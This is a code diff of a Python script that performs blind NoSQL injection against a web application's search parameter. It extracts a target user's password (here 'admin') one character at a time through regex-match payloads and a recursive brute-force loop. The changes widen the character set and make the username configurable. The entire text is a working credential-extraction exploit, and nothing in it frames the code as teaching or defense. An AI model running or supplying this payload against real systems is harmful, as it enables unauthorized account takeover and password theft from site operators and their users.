@@ -15,27 +15,30 @@ lowercase = string.ascii_lowercase
 uppercase = string.ascii_uppercase
 digits = string.digits
 other = "-"
-attempts = list(lowercase + digits + other)
+attempts = list(uppercase + lowercase + digits + other)
 
-def injectPayload(payload=None, target=None, pattern=None):
-    t = target + "/?search=target_username%27%20%26%26%20this.password.match(/" + payload + "/)%00"
+
+def inject_payload(payload=None, target=None, pattern=None, username=None):
+    t = target + "/?search=" + username + "%27%20%26%26%20this.password.match(/" + payload + "/)%00"
     response = urllib.request.urlopen(t)
     data = response.read()
     return pattern in str(data)
 
-def bruteForce(password="", target=None, pattern=None):
+
+def brute_force(password="", target=None, pattern=None, username=None):
     for attempt in attempts:
         print("Attempting: " + attempt + ", Current pattern " + password)
         attempted = password + attempt
-        injectPayload("^" + attempted + ".*$", target, pattern)
-        if injectPayload("^" + attempted + ".*$", target, pattern):
+        inject_payload("^" + attempted + ".*$", target, pattern, username)
+        if inject_payload("^" + attempted + ".*$", target, pattern, username):
             password += attempt
             print("Last found pattern: " + password)
-            bruteForce(password, target, pattern)
+            brute_force(password, target, pattern, username)
             break
         elif attempt == attempts[-1]:
             print("Last found pattern: " + password)
             exit(0)
 
+
 print("Started bruteforcing the target: " + target)
-bruteForce("", target, pattern)
+brute_force("", target, pattern, "admin")
